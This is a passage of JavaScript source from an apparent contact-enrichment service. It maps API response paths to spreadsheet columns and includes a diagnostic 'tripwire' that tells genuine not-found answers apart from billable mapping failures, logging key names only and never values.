    'data.meta_tags.og.extra.image:height',
    'data.meta_tags.og.extra.image:type',
    'data.meta_tags.og.extra.image:width',
    // crawler directives and an app name, not a GTM field.
    'data.meta_tags.other.application-name',
    'data.meta_tags.other.googlebot',
    // page-rendering detail (charset, viewport, robots, language, keywords).
    'data.meta_tags.seo.charset',
    'data.meta_tags.seo.keywords',
    'data.meta_tags.seo.language',
    'data.meta_tags.seo.robots',
    'data.meta_tags.seo.viewport',
    // the Twitter card duplicates the og/seo title and description; the extras are image dimensions.
    'data.meta_tags.twitter.card',
    'data.meta_tags.twitter.description',
    'data.meta_tags.twitter.extra.image:alt',
    'data.meta_tags.twitter.extra.image:height',
    'data.meta_tags.twitter.extra.image:type',
    'data.meta_tags.twitter.extra.image:width',
    'data.meta_tags.twitter.image',
    'data.meta_tags.twitter.title',
    // one positional hop out of the redirect list.
    'data.redirect_chain.0',
    // same histogram, same reason.
    'data.tech_stack.categories_count.Backend Framework',
    'data.tech_stack.categories_count.Build Tool',
    'data.tech_stack.categories_count.CMS',
    'data.tech_stack.categories_count.Framework',
    'data.tech_stack.categories_count.Library',
    'data.tech_stack.categories_count.SEO',
    // echoes the url that was asked.
    'data.url',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
    'meta.modules_run.0',
  ]),
  youtube_channel: Object.freeze([
    // RECORDED EMPTY (`""`) on the captured channel. An empty string names the key and
    // says nothing about the value, and `mapResponse` drops an empty scalar, so
    // mapping these would declare columns that never populate.
    'data.country',
    'data.joined_date',
    // an image URL.
    'data.avatar_url',
    'data.banner_url',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  youtube_channel_videos: Object.freeze([
    // RECORDED EMPTY (`""`) in the capture: the key exists, the value says nothing, and
    // `mapResponse` drops an empty scalar — so a map entry here is a column that never
    // populates.
    'data.videos.0.publish_date',
    // an image URL.
    'data.videos.0.thumbnail',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  youtube_search: Object.freeze([
    // RECORDED EMPTY (`""`) in the capture: the key exists, the value says nothing, and
    // `mapResponse` drops an empty scalar — so a map entry here is a column that never
    // populates.
    'data.results.0.publish_date',
    // a search snippet, already represented by the title and channel.
    'data.results.0.description',
    // an image URL.
    'data.results.0.thumbnail',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
  youtube_video: Object.freeze([
    // one positional chapter out of a list — a row cannot hold a list.
    'data.chapters.0.end_time',
    'data.chapters.0.start_time',
    'data.chapters.0.title',
    // an image URL.
    'data.thumbnails.0.url',
    // transport diagnostics (cache hit, latency, a crawl quality warning) — not a field anyone bought.
    'meta.cache_hit',
    'meta.execution_time_ms',
  ]),
});

// find_personal_email USED to be unmapped here, because the spec documented an async
// job envelope ({data, id, status}) while the backend's generated manifest recorded a
// resolved payload ({first_personal_email, message}), and either map would have been
// wrong against the other. The 2026-08-31 capture settles it in favour of the envelope:
// the server answers {id, data:{email, status, verifier}, status}. A recorded response
// outranks two disagreeing documents, so it is mapped above.

/**
 * Read a dotted path off a response body and return it only if it is a SCALAR.
 *
 * `result.email` · `positionGroups.0.profilePositions.0.title` · `industries.0`
 *
 * A numeric segment indexes an array. Anything missing, null, or still an object or
 * array at the end of the path returns undefined — a column is a spreadsheet cell, and
 * an object is not one. There is deliberately no fuzzy matching and no fallback to a
 * different envelope: the path names exactly one location, so a map entry that stops
 * resolving is a LOUD failure through inspectResponse rather than a quiet empty column.
 */
export function readPath (body, dottedPath) {
  if (!body || typeof body !== 'object') return undefined;
  let cur = body;
  for (const seg of String(dottedPath).split('.')) {
    if (cur === null || cur === undefined) return undefined;
    if (Array.isArray(cur)) {
      if (!/^\d+$/.test(seg)) return undefined;
      cur = cur[Number(seg)];
      continue;
    }
    if (typeof cur !== 'object') return undefined;
    if (!Object.prototype.hasOwnProperty.call(cur, seg)) return undefined;
    cur = cur[seg];
  }
  if (cur === null || cur === undefined) return undefined;
  if (Array.isArray(cur) || typeof cur === 'object') return undefined;
  return cur;
}

/**
 * Map one endpoint's response onto output columns.
 *
 * Keys are dotted paths from the BODY ROOT (see readPath). Values that are absent,
 * null, empty-after-trim, or non-scalar produce no column. An endpoint with no map
 * returns {} rather than guessing.
 *
 * `false` and `0` DO produce a column: `open_to_work: false` and `email_is_company:
 * false` are answers, and dropping them would make "we asked and the answer was no"
 * indistinguishable from "we never asked".
 */
export function mapResponse (endpoint, body) {
  const map = own(RESPONSE_MAPS, endpoint) ? RESPONSE_MAPS[endpoint] : null;
  if (!map || !body || typeof body !== 'object') return {};
  const out = {};
  for (const [apiPath, column] of Object.entries(map)) {
    const v = readPath(body, apiPath);
    if (v === undefined) continue;
    if (typeof v === 'string' && v.trim() === '') continue;
    out[column] = v;
  }
  return out;
}

// ---------------------------------------------------------------------------
// The empty-column tripwire
// ---------------------------------------------------------------------------
//
// This failure shipped once already: a 2xx response whose keys did not match the map
// produced ZERO output columns while the user paid ~8 credits a contact, and the
// downstream "is this row already enriched?" check (toDescriptor, keyed on `title`
// and `company_name`) could never become true, so every row re-enriched forever.
// The failure was silent, paid, and landed on the FIRST run.
//
// Any RESPONSE_MAPS row not backed by a recorded live fixture is spec-derived, so
// the same class of failure is one camelCase/snake_case disagreement away.
// This is the detector that makes it loud instead of silent.
//
// THE DISTINCTION THAT MATTERS — and the reason this is not just `count === 0`:
//
//   genuine not-found  the API answered, and had no data. `{}`, `{data: null}`,
//                      `{email: null, status: "not_found"}`. Zero columns is the
//                      CORRECT answer here. Not an error.
//
//   mapping failure    the API answered WITH data and we failed to read it. The
//                      body carries data-bearing keys and none of them produced a
//                      column. This is a bug in RESPONSE_MAPS, it is billable, and
//                      it must never be written out as a blank column.
//
// Conflating them hides the bug forever, so the test is on the RESPONSE BODY, not
// on the column count alone: non-empty body + zero columns == mapping failure.
//
// LAW 7. The evidence recorded here is the response's KEY NAMES only — never a
// value. A key set is what the next debugger needs to fix the map; a value is PII.

export const MAP_MAPPED = 'mapped';
export const MAP_EMPTY = 'empty_response';
export const MAP_UNMAPPED = 'mapping_failure';
export const MAP_NO_MAP = 'no_response_map';

/**
 * The response carried data AND produced columns, but not the one the call was bought
 * for. Added 2026-09-02, because a zero-column test could not see the failure that
 * mattered most: email_finder returned five keys, one of them (`provider`) matched the
 * map by coincidence, the column count was 1, and `mapped` was reported while the
 * email address — the entire reason for a 5-credit call — was dropped.
 *
 * This is a mapping failure and it is billable, so it is reported as loudly as
 * MAP_UNMAPPED. It is a SEPARATE status because the remedy differs: MAP_UNMAPPED means
 * the map matches nothing and is probably reading the wrong envelope, MAP_PARTIAL means
 * the map is mostly right and one specific path has moved.
 */
export const MAP_PARTIAL = 'partial_mapping_failure';

/**
 * Envelope/meta keys that never carry contact data. A body that holds only these
 * is an empty answer, not a mapping failure — otherwise `{success: true, data: null}`
 * would be reported as a bug on every genuine not-found.
 *
 * A key that an endpoint's own map claims (email_verifier maps `status`,
 * phone_finder maps `status`) is NEVER treated as meta: the map is the authority.
 */
// `why` is the compact waterfall's one-line failure summary. It replaces the
// envelope's `error` sentence, which is already listed here, and appears ONLY when
// `ok` is false — so it is envelope, never data. Listing it keeps the tripwire's
// `unrecognised_keys` evidence about the endpoint's own fields.
export const ENVELOPE_META_KEYS = Object.freeze([
  'success', 'ok', 'found', 'status', 'message', 'error', 'errors', 'code', 'why',
  // The finder endpoints' transport diagnostics, recorded 2026-08-31. They are present
  // on a HIT and on a MISS alike, so counting them as endpoint data made every genuine
  // not-found look like a response the map had failed to read.
  'providers_tried', 'execution_log', 'billed',
  'request_id', 'requestId', 'id', 'meta', 'timestamp', 'took',
  'credits', 'credits_charged', 'creditsCharged', 'credits_used', 'creditsUsed',
  'usage', 'balance', 'reserved', 'page', 'limit', 'total', 'totalElements',
  '_list_count',
]);

/** Does this value carry anything? `null`, `''`, `[]` and `{}` do not. */
function dataBearing (v) {
  if (v === undefined || v === null) return false;
  if (Array.isArray(v)) return v.length > 0;
  if (typeof v === 'object') return Object.keys(v).length > 0;
  return String(v).trim() !== '';
}

/**
 * Map a response AND report how the mapping went.
 *
 * `mapResponse` keeps its old signature and return shape (callers and tests depend
 * on it); this is the diagnostic sibling. Everything the tripwire needs to fire, and
 * everything a debugger needs to fix the map, comes out of here.
 *
 * @returns {{
 *   endpoint: string, status: string, is_mapping_failure: boolean,
 *   columns: Record<string, unknown>, column_count: number, mapped_columns: string[],
 *   raw_keys: string[], data_bearing_keys: string[],
 *   recognised_keys: string[], unrecognised_keys: string[], expected_keys: string[],
 *   map_status: string, reason: string
 * }}
 */
export function inspectResponse (endpoint, body) {
  const map = own(RESPONSE_MAPS, endpoint) ? RESPONSE_MAPS[endpoint] : null;
  const mapKeys = map ? Object.keys(map) : [];
  const columns = mapResponse(endpoint, body);
  const mappedColumns = Object.keys(columns);

  // Describe the object the map actually reads. Since 2026-09-02 that is the body
  // ROOT — map keys are full dotted paths — so there is no unwrapping to mirror here.
  // A recorded envelope (`result`, `data`) is flattened into the evidence alongside the
  // top level, because "the body only had {success, result, provider}" tells a debugger
  // nothing about where the value they are missing actually went.
  const src = body;
  const envelopeKey = (src && typeof src === 'object' && !Array.isArray(src))
    ? ['result', 'data'].find(k => src[k] && typeof src[k] === 'object' && !Array.isArray(src[k])) ?? null
    : null;

  let rawKeys = [];
  let bearing = [];
  if (Array.isArray(src)) {
    // An array body handed to a single-endpoint map. Nothing can match, but the
    // payload is real — that is a mapping failure, not an empty answer.
    rawKeys = src.length ? [`[array:${src.length}]`] : [];
    bearing = rawKeys;
  } else if (src && typeof src === 'object') {
    const isMeta = (k) => ENVELOPE_META_KEYS.includes(k) && !mapKeys.includes(k);
    const collect = (obj, prefix) => {
      for (const k of Object.keys(obj)) {
        const path = prefix ? `${prefix}.${k}` : k;
        rawKeys.push(path);
        if (!prefix && isMeta(k)) continue;
        if (dataBearing(obj[k])) bearing.push(path);
      }
    };
    collect(src, '');
    // Descend one level into a recorded envelope. One level, not arbitrary depth: the
    // point is to name where the payload is, not to enumerate the whole tree.
    if (envelopeKey) {
      // The envelope itself is a container, not a field. Reporting `result` as a
      // data-bearing key would make every wrapped response look like an unread field.
      bearing = bearing.filter(k => k !== envelopeKey);
      collect(src[envelopeKey], envelopeKey);
    }
  }

  const recognised = bearing.filter(k => mapKeys.includes(k));
  const unrecognised = bearing.filter(k => !mapKeys.includes(k));

  // The column this call was bought for. Absent from the table means "no single field
  // is the point of this endpoint", and the partial check does not apply.
  const headline = own(RESPONSE_HEADLINE_COLUMNS, endpoint)
    ? RESPONSE_HEADLINE_COLUMNS[endpoint]
    : null;
  const headlinePresent = headline ? Object.prototype.hasOwnProperty.call(columns, headline) : true;
  // A headline column can only be MISSING in a way worth shouting about if the response
  // carried something the map failed to read. When the body is empty the answer is a
  // genuine not-found and zero columns is correct.
  //
  // `mappedColumns.length > 0` is part of the definition, not an optimisation. A
  // response that produced NO columns is a full mapping failure (MAP_UNMAPPED) and
  // already had a status; PARTIAL is specifically the case the old detector could not
  // see — some columns came through, so the count looked healthy, and the one that
  // mattered did not.
  const headlineMissingWithData = Boolean(headline)
    && !headlinePresent
    && mappedColumns.length > 0
    && unrecognised.length > 0;

  let status, reason;
  if (mappedColumns.length > 0 && !headlineMissingWithData) {
    status = MAP_MAPPED;
    reason = `${mappedColumns.length} column(s) mapped`;
  } else if (headlineMissingWithData) {
    // THE email_finder FAILURE. Columns were produced, so the old zero-column test
    // reported success — while the field the call exists to deliver was dropped.
    status = MAP_PARTIAL;
    reason = `the response carried data but produced no "${headline}" column, which is what this `
      + `endpoint is called for. ${mappedColumns.length} other column(s) mapped, and `
      + `${unrecognised.length} data-bearing key(s) went unread: ${unrecognised.slice(0, 8).join(', ')}. `
      + `RESPONSE_MAPS[${endpoint}] has a path that no longer resolves (${RESPONSE_MAP_STATUS})`;
  } else if (bearing.length === 0) {
    // The API answered and had nothing. Zero columns is the right answer.
    status = MAP_EMPTY;
    reason = 'the response carried no data — a genuine not-found, not a mapping failure';
  } else if (!map) {
    status = MAP_NO_MAP;
    reason = `no RESPONSE_MAPS entry for "${endpoint}", but the response carried `
      + `${bearing.length} data-bearing key(s) — a paid response we cannot read`;
  } else {
    status = MAP_UNMAPPED;
    reason = recognised.length === 0
      ? `the response carried ${bearing.length} data-bearing key(s) and NONE are in the `
        + `field map — RESPONSE_MAPS[${endpoint}] is wrong (${RESPONSE_MAP_STATUS})`
      : `the field map recognised ${recognised.length} key(s) but none produced a column `
        + '(the values were arrays/objects, which are not spreadsheet columns)';
  }

  return {
    endpoint,
    status,
    // MAP_PARTIAL is a mapping failure. It is billable, the user paid for a field they
    // did not get, and the only reason it was ever reported as success is that the old
    // test counted columns instead of asking which column mattered.
    is_mapping_failure: status === MAP_UNMAPPED || status === MAP_NO_MAP || status === MAP_PARTIAL,
    headline_column: headline,
    headline_present: headlinePresent,
    columns,
    column_count: mappedColumns.length,
    mapped_columns: mappedColumns,
    raw_keys: rawKeys,             // KEY NAMES ONLY. Never a value (law 7).
    data_bearing_keys: bearing,
    recognised_keys: recognised,
    unrecognised_keys: unrecognised,
    expected_keys: mapKeys,
    map_status: RESPONSE_MAP_STATUS,
    reason,
  };
}

/**
 * Read the per-hop attribution the learnings flywheel depends on. `email_finder`
 * returns `provider` and `confidence`; that is the whole basis for per-segment
 * provider hit-rates in /learn, so it is read here and journalled per hop.
 *
 * Field maps are not live-verified for every endpoint, so this reads the documented top-level names and returns null rather than
 * inventing a nested path.
 */
export function readAttribution (body) {
  if (!body || typeof body !== 'object') return { provider: null, confidence: null };
  const src = body.data && typeof body.data === 'object' ? body.data : body;
  return {
    provider: src.provider ?? null,
    confidence: src.confidence ?? null,
  };
}
